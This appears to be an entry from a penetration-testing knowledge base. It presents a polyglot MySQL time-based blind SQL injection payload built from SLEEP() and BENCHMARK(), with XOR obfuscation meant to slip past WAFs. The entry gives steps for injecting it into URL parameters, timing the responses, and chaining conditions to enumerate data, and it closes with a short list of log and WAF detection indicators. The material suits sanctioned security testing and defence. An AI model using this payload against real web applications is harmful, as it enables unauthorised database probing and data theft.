---
type: code
language: SQL
verified: true
platforms:
  - Web
tags:
  - sql-injection
  - polyglot
  - time-based-blind
validated: true
---

# Polyglot-MySQL-Sleep-Delay-Payload

## Code

```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/

/* MySQL only */
IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
```

## Description

This SQL code snippet is a polyglot payload designed for time-based blind SQL injection detection in MySQL databases. It uses SLEEP() to introduce a 1-second delay in modern versions and falls back to BENCHMARK() for older versions (<5.0). The payload is wrapped in universal comment structures (/* */, --) and obfuscated with XOR to evade string filters and WAFs, making it injectable in various contexts like numeric or string parameters without breaking the query syntax.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| Sleep Duration | Time in seconds for the delay (modify SLEEP(value)) | 5 (for longer detectable delays) |
| Benchmark Loops | Number of iterations for older MySQL fallback (modify BENCHMARK(value,...)) | 2000000 (adjust for desired delay length) |

(No dynamic variables; static payload, but values can be tuned for testing.)

## Usage

Inject this payload into vulnerable web application parameters (e.g., via URL: ?id=1[PASTE_PAYLOAD]) during manual SQLi testing. Use tools like curl or Burp Suite to send requests and time responses. A consistent delay confirms injection success. Chain with boolean conditions (e.g., AND (IF(condition, SLEEP(5),0))) for data enumeration. Ideal for blind scenarios where errors or data dumps are suppressed.

## Detection

- Web server logs showing high-latency requests (>5s) correlated with specific parameters.
- Database query logs revealing SLEEP(), BENCHMARK(), or @@version accesses from untrusted inputs.
- WAF alerts on XOR, comment wrappers, or anomalous SQL functions in traffic.
- Intrusion detection systems (IDS) monitoring for time-based anomalies in app traffic.

## Related

- [[procedures/Detect-SQL-Injection-with-Polyglot-Sleep-Payload]]
- [[tools/sqlmap]]
